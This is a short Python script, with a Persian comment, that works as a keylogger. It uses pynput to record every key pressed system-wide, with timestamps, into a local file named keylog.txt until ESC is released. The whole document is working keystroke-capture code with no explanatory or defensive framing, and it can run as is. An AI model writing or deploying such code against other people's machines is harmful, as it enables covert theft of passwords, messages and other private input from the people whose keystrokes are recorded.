from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"

def write_log(key):
    with open(log_file, "a", encoding="utf-8") as f:
        time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            f.write(f"[{time_stamp}] {key}\n")
        except AttributeError:
            f.write(f"[{time_stamp}] {key}\n")
def on_press(key):
    write_log(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # متوقف کردن کی‌لاگر با کلید ESC
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
